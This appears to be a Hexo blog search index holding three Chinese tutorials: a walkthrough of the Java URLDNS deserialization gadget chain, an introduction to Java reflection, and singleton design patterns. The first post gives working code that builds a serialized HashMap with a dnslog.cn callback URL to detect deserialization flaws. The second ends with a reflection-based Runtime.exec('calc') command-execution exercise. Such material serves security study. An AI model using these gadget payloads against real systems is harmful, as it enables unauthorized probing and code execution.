<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RULDNS链</title>
    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h2 id="URLDNS链优点"><a href="#URLDNS链优点" class="headerlink" title="URLDNS链优点"></a>URLDNS链优点</h2><ol>
<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ol>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>ysoserial 中URLDNS链 ， 看这个利用链只涉及两个类<strong>HashMap</strong>和<strong>URL</strong>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509090622554.png" alt="image-20240509090622554"></p>
<h3 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h3><p><strong>HashMap</strong>自己实现了<code>readObject()</code>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509093642516.png" alt="image-20240509093642516"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>putVal重新计算了key的hash，跟进<code>hash()</code>（Ctrl+鼠标左键）</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509093734192.png" alt="image-20240509093734192"></p>
<p>代码意思是如果key为null返回0，如果不为null，则调用key的<code>hashCode()</code>。</p>
<p>那我们思考，假如有个a类有<code>hashCode()</code>方法，把a类作为hashMap的key，在这里就相当于调用a类的<code>hashCode()</code>，这就是同名函数调用。</p>
<h3 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h3><p>承接上文，<strong>URL</strong>类中有<code>hashCode()</code>方法,<code>hashCode()</code>被handler调用，handler 又是 <strong>URLStreamHandler</strong> 的抽象类，我们再去找 <strong>URLStreamHandler</strong> 的 <code>hashCode()</code> 方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509102412486.png" alt="image-20240509102412486"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>hashCode()</code>方法传入一个url，<code>getHostAddress(url)</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509103443938.png" alt="image-20240509103443938"></p>
<p>进入<code>getHostAddress()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509103838469.png" alt="image-20240509103838469"></p>
<p>这段代码意思是获取给定 URL 对象的主机地址。如果主机地址已经缓存过，则直接返回缓存的地址；否则，尝试解析主机名获取主机地址，并缓存结果。在⽹络上其实就是⼀次 DNS 查询。</p>
<p><strong>流程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="line">1. HashMap -&gt; readObject() -&gt; putVal() -&gt; hash(key) </span><br><span class="line">//hash(Object key)会对key调用hashCode()</span><br><span class="line">2. key.hashCode()</span><br><span class="line">// 如果传入的key 是一个URL对象</span><br><span class="line">3. key = URL url</span><br><span class="line">// 然后会触发URL对象hashcode()</span><br><span class="line">4. url.hashcode()</span><br><span class="line">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="line">5. url.handler.hashcode(url)</span><br><span class="line">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="line">6. getHostAddress(url)</span><br><span class="line">// 最后发起一次dns请求</span><br><span class="line">7. dns请求</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>参考上面的流程，我们需要创建一个hashMap，在hashMap的key传入url对象，看<strong>URL</strong>的构造方法，最简单的构造方法直接放入一个url地址就可以</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509145326944.png" alt="image-20240509145326944"></p>
<p>hashMap不直接直接传参，必须用<code>put()</code>方法，put进去。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509145753562.png" alt="image-20240509145753562"></p>
<p>如果一切顺利的话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="line">1. HashMap -&gt; readObject() -&gt; putVal() -&gt; hash(key) </span><br><span class="line">//hash(Object key)会对key调用hashCode()</span><br><span class="line">2. key.hashCode()</span><br><span class="line">// 如果传入的key 是一个URL对象</span><br><span class="line">3. key = URL url</span><br><span class="line">// 然后会触发URL对象hashcode()</span><br><span class="line">4. url.hashcode()</span><br><span class="line">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="line">5. url.handler.hashcode(url)</span><br><span class="line">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="line">6. getHostAddress(url)</span><br><span class="line">// 最后发起一次dns请求</span><br><span class="line">7. dns请求</span><br></pre></td></tr></table></figure>

<h3 id="初遇难题"><a href="#初遇难题" class="headerlink" title="初遇难题"></a>初遇难题</h3><p>但是我们发现在序列化的时候就已经触发了</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509150138622.png" alt="image-20240509150138622"></p>
<p>跟进<strong>hashMap</strong>的<code>put()</code>方法，发现在put的时候就已经对key进行一次<code>hash()</code>了，触发了<strong>URL</strong>类的<code>hashCode()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509111302937.png" alt="image-20240509111302937"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509152432465.png" alt="image-20240509152432465"></p>
<p>我们发现，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509152449960.png" alt="image-20240509152449960"></p>
<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>思路：在put前，使hashCode不等于-1，put后hashCode等于-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        </span><br><span class="line">         <span class="comment">//思路</span></span><br><span class="line">        <span class="comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line">        <span class="comment">//将hashCOde值改为不是-1，put()的时候就不会发起请求</span></span><br><span class="line">        <span class="comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">//hashMap.put(url, 1);</span></span><br><span class="line">        <span class="comment">//将hashCode值改为-1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Serialization(hashMap);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//实现</span></span><br><span class="line">        HashMap&lt;URL, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//新建一个hashMap</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="comment">//url</span></span><br><span class="line">        </span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; c = url.getClass();  <span class="comment">//获取一个Class</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodefile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  <span class="comment">//获取hashCode字段</span></span><br><span class="line">        hashCodefile.setAccessible(<span class="literal">true</span>);  <span class="comment">//设置字段访问权限</span></span><br><span class="line">        hashCodefile.set(url, <span class="number">123</span>);	 <span class="comment">//将hashCode改为123</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashCodefile.set(url, -<span class="number">1</span>);  <span class="comment">//put完后改为-1</span></span><br><span class="line"><span class="comment">//        Serialization(hashMap);</span></span><br><span class="line">        Deserialization(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialization</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123; <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么hashMap要实现自己的writeObject和readObject方法</a></p>
<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Java反序列化基础篇-01-反序列化概念与利用</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<h2 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h2><p>反射是一种间接操作目标对象的机制，允许程序在运行时获取类的信息，并且在运行时动态地创建对象、调用方法、访问字段等等；<strong>对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。</strong></p>
<hr>
<p>实质就是得到一个Class对象后，反向获取Class对象的对象。</p>
<h2 id="Class类、Class对象与class"><a href="#Class类、Class对象与class" class="headerlink" title="Class类、Class对象与class"></a>Class类、Class对象与class</h2><p><code>Class类</code>是java中的一个类，位于<strong>java.lang</strong>包中。它提供了用于获取类信息和操作类或对象的属性和方法的方法。<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240514205516919.png" alt="image-20240514205516919"></p>
<p><code>Class对象</code>是JVM在运行时保留的每个类的描述信息。Class对象包含了该类的所有信息，包括类的名称、属性、方法、构造函数等。Class对象可以通过Class类的各种方法获取。</p>
<p><code>class</code>是java的关键字，用于声明类。</p>
<hr>
<p><strong>对Class类解读:</strong></p>
<p>我们通常认为类是对象的抽象和集合，Class就相当于是对类的抽象和集合。<br>也可以认为对象是类的实例，类是Class的实例。</p>
<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>通常有以下几种方法获取一个类的Class对象</p>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;Test&quot;</span>);     如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</span><br></pre></td></tr></table></figure>

<h3 id="Test-class"><a href="#Test-class" class="headerlink" title="Test.class"></a>Test.class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; bClass = Test.class;    如果已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就可以直接拿它的class属性。</span><br></pre></td></tr></table></figure>

<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test cClass= <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Test</span>&gt; aClass1 = cClass.getClass();  如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240514215718317.png" alt="image-20240514215718317"></p>
<p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p>
<h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><p>获取到Class之后，实例化对象，<code>newInstance()</code>方法调用无参的构造器创建对象。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516090748055.png" alt="image-20240516090748055"></p>
<p>(<strong>Class</strong>类中的<code>newInstance()</code>方法)</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102707921.png" alt="image-20240516102707921"></p>
<p><code>java.lang.relect.Constructor</code>类里也有一个<code>newInstance()</code>方法可以创建对象，该方法和Class类中的<code>newInstance()</code>方法很像，但是相比之下，Constructor类的<code>newInstance()</code>方法更加强大，我们可以通过这个<code>newInstance()</code>方法调用有参数的和私有的构造方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102944537.png" alt="image-20240516102944537"></p>
<p>这时有个问题，比如一个类有很多的构造方法，我们怎么能找到我们想要的构造方法呢？我们可以使用<code>getConstructor()</code>,它根据提供的参数类型来定位特定的构造函数。可以从<code>getConstructor()</code>的函数声明中看到，参数类型是Class可变长参数。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516094652144.png" alt="image-20240516094652144"></p>
<p>因为Test类中有两个属性，<strong>Sting name</strong>和<strong>int age</strong>，<code>getConstructor()</code>填入<strong>String.class</strong>和<strong>int.class</strong>,发现报错了，报错信息提示没有这个方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516091359629.png" alt="image-20240516091359629"></p>
<p>可以看到Test类中<strong>age</strong>属性是私有的，这时使用<code>getDeclaredConstructor()</code>方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516090723742.png" alt="image-20240516090723742"></p>
<p>设置访问权限为true。就可以通过有参构造函数实例化对象。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516091419131.png" alt="image-20240516091419131"></p>
<h2 id="获取类的属性"><a href="#获取类的属性" class="headerlink" title="获取类的属性"></a>获取类的属性</h2><p>通过<code>getFields()</code>可以获取属性，但是发现这里只获取了name，age并没有被获取，原因其实和上面类似，必须用<code>getDeclaredFields()</code>并设置访问权限。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516095310090.png" alt="image-20240516095310090"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516095330837.png" alt="image-20240516095330837"> </p>
<p><code>set()</code>方法通常和<code>getField()</code>搭配使用,<code>set()</code>方法是<code>Field</code>类的一部分，用于通过反射机制设置对象的字段值，具体一点就是<code>Field</code>对象表示类中的一个成员变量，<code>set()</code>方法允许修改这个字段的值，即使该字段是私有的。在使用之前，通常需要调用<code>setAccessible(true)</code>来绕过Java的访问控制检查。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516101853830.png" alt="image-20240516101853830"></p>
<p><strong>age</strong>属性是私有的</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102050549.png" alt="image-20240516102050549"></p>
<p>（通过<code>getDeclaredField()</code>设置访问权限）</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102124715.png" alt="image-20240516102124715"></p>
<h2 id="调用类的方法"><a href="#调用类的方法" class="headerlink" title="调用类的方法"></a>调用类的方法</h2><p>Test类有public Hello方法和Private prHello方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516113808489.png" alt="image-20240516113808489"></p>
<p>通过<code>getMethods()</code>可以获取公共方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516112756232.png" alt="image-20240516112756232"></p>
<p>通过<code>getDeclaredMethods()</code>可以获取公共方法和私有方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516112826908.png" alt="image-20240516112826908"></p>
<p><code>getMethod()</code>通常和<code>invoke()</code>搭配，<code>invoke()</code>可以动态地在运行时调用对象的方法。其实也不难理解，我们通过<code>getMethod()</code>反射获得一个方法后，肯定需要指定是哪个类，并且指明执行的参数。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516131226025.png" alt="image-20240516131226025"></p>
<p>用<code>getMethod()</code>调用一下Test类中的<code>Hello()</code>方法，可以发现它调用的是无参的方法，和实例化对象的情况类似，报错了，需要指明它的类型，否则调用无参的方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516130413038.png" alt="image-20240516130413038"></p>
<p>(Class类中的<code>getMethod()</code>方法)</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516113750554.png" alt="image-20240516113750554"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516130817172.png" alt="image-20240516130817172"></p>
<h2 id="小练习，反射弹计算器"><a href="#小练习，反射弹计算器" class="headerlink" title="小练习，反射弹计算器"></a>小练习，反射弹计算器</h2><p>正常情况下咱们弹计算器<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516133359336.png" alt="image-20240516133359336"></p>
<p>反射写法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516141618708.png" alt="image-20240516141618708"></p>
<p>因为 <code>getRuntime()</code>是静态方法，属于类，所以<code>getRuntime.invoke()</code>;不需要指定对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516143222774.png" alt="image-20240516143222774"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取Runtime 类的 Class 对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="comment">//获取 Runtime 类中名为 getRuntime 的方法的引用</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//getMethod() 方法获取 exec 方法的引用</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//用 invoke() 方法调用 exec</span></span><br><span class="line">        exec.invoke(runtimeInstance, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/MrYushiwen/article/details/107380536">JAVA反射</a></p>
<p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">java反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/7029?time__1311=n4+xnD0GDti=zuDBqooGkY=G=L1K7K6dx&alichlgref=https://xz.aliyun.com/t/7029#toc-0">JAVA反序列化 - 反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YicWe4FPmD&alichlgref=https://www.google.com/">JAVA安全基础（二）– 反射机制</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-单例模式</title>
    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();  <span class="comment">//用于引用全局唯一的单例对象，在一开始就创建好</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;  <span class="comment">//不允许随便new</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;   <span class="comment">//获取全局唯一的单例对象</span></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        System.out.println(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;  <span class="comment">//在一开始不创建对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;  <span class="comment">//如果实例为空就创建</span></span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种方法有种缺陷，由于懒汉式在方法中进行初始化，在多线程的环境下，可能会出现问题。</p>
<h3 id="懒汉式-改进"><a href="#懒汉式-改进" class="headerlink" title="懒汉式-改进"></a>懒汉式-改进</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种效率比较低，只能又一个线程能进入同步块，其他的必须要等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();  <span class="comment">//双重检查</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

